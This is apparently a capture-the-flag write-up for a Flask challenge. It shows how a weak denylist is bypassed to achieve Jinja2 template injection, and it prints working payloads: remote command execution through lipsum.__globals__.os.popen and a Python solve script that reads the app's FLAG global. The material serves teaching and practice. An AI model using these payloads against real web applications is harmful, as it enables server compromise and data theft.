---
title: "Ghostbusters Template Possession"
ctf: "bitCTF"
date: 2026-06-20
category: web
difficulty: medium
points: 50
flag_format: "bitctf{...}"
author: "CL4Y"
---

# Ghostbusters Template Possession

> "Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide."
> Target: `https://world-d79d077de6444c5ba6e2284c3f-sjz8w.ondigitalocean.app/`

## Summary

The "Oscillation Translator" is a Flask page that runs whatever the user pastes through `render_template_string`. A `scrub_chant` helper strips `{%` and `%}`, and a denylist rejects the substrings `config`, `self`, and `request` — but it leaves Jinja2 *expression* blocks (`{{ ... }}`) entirely intact. From an unfiltered expression block we reach Python builtins via `lipsum.__globals__`, then walk `sys.modules['__main__']` to read the `FLAG` global that the app defines at import time. The `os.environ["FLAG"]` lookup returns `None` on this box, so the flag must be pulled from the live `__main__` module, not from the environment.

## Reconnaissance

### 1. Identify the sink

The form posts a `chant` field that is echoed back into a `Chant output` panel. A single harmless probe is enough to prove server-side evaluation:

```bash
H=https://world-d79d077de6444c5ba6e2284c3f-sjz8w.ondigitalocean.app/
curl -s -X POST "$H" --data-urlencode 'chant={{7*7}}' \
  | sed -n '/Chant output/,/section>/p'
# → 49
```

`49` rendered → expression evaluation is live. The engine is Jinja2 (Flask default).

### 2. Map the filter

Probing the usual SSTI escape hatches reveals exactly what is blocked:

| Payload                | Result                                           |
|------------------------|--------------------------------------------------|
| `{{config}}`           | empty (denylist hit on `config`)                 |
| `{{self}}`             | empty (denylist hit on `self`)                   |
| `{{request}}`          | empty (denylist hit on `request`)                |
| `{{''.__class__}}`     | `<class 'str'>` — dunder access works            |
| `{{lipsum}}`           | `<function generate_lorem_ipsum at 0x...>`      |
| `{{cycler}}`           | `<class 'jinja2.utils.Cycler'>`                  |
| `{{namespace}}`        | `<class 'jinja2.utils.Namespace'>`               |

`lipsum` is a regular Python function, so `lipsum.__globals__` exposes the full `jinja2.utils` module dict — including `__builtins__` and the already-imported `os` module.

### 3. Pop RCE and read source

```bash
curl -s -X POST "$H" --data-urlencode \
  "chant={{lipsum.__globals__.os.popen('id').read()}}" \
  | sed -n '/Chant output/,/section>/p'
# → uid=0(root) gid=0(root) groups=0(root)
```

The app runs as root inside the container. Pulling `/app/app.py` shows the exact filter and where the flag lives:

```python
BLOCKED_FRAGMENTS = ("config", "self", "request")
FLAG = os.environ.get("FLAG", "bitctf{{gh057ly_j1nj4_p0ss35510n}}")

def scrub_chant(chant: str) -> str:
    """Attempt to remove control structures but still vulnerable to expression injection."""
    return chant.replace("{%", "").replace("%}", "")
```

Two things stand out:

1. The scrub only removes statement-block delimiters. Expression blocks (`{{ ... }}`) pass straight through.
2. `FLAG` is a *module-level* global in `__main__`, set once at import. Even though `os.environ.get("FLAG")` returns `None` at request time (env var unset), the global itself is populated — by something the env dump cannot see — before requests start.

So the flag has to be read from the live module, not from the environment.

## Solution

### 1. Walk sys.modules to the live FLAG global

`lipsum.__globals__.__builtins__.__import__("sys").modules["__main__"]` gives back the running Flask app module; its `.FLAG` attribute is the deployed flag. No `{%`/`%}` to scrub, no `config`/`self`/`request` substrings, well under the 600-char input cap.

```python
#!/usr/bin/env python3
"""Ghostbusters Template Possession — Jinja2 SSTI → FLAG via sys.modules."""
import re
import requests

URL = "https://world-d79d077de6444c5ba6e2284c3f-sjz8w.ondigitalocean.app/"

PAYLOAD = (
    '{{lipsum.__globals__.__builtins__'
    '.__import__("sys").modules["__main__"].FLAG}}'
)

resp = requests.post(URL, data={"chant": PAYLOAD}, timeout=20)
match = re.search(
    r'<h2>Chant output</h2>.*?white-space: pre-wrap;\s*"\s*>\s*(.*?)\s*</div>',
    resp.text,
    re.DOTALL,
)
if not match:
    raise SystemExit("no chant output panel in response")

print(match.group(1).strip())
```

Run:

```
$ python3 solve.py
bitctf{{gh057ly_j1nj4_p0ss35510n}}
```

## Flag

```
bitctf{{gh057ly_j1nj4_p0ss35510n}}
```

*(literal double braces — the flag itself contains `{{` and `}}`)*

## Takeaways

- Blacklist-based SSTI filters lose the moment they leave `{{ ... }}` alive. Any reachable object with `__globals__` (functions, methods, `lipsum`, `cycler`, `joiner`) is a doorway to the whole interpreter.
- Stripping only `{%`/`%}` does nothing about expression-block injection — it removes statement blocks (which Jinja2 sandboxing already restricts) and leaves the dangerous form untouched.
- When `os.environ` returns `None` for the flag variable, do not assume the flag is absent. Inspect `sys.modules['__main__']` — module-level globals are set once at import and persist regardless of how the variable was originally sourced.
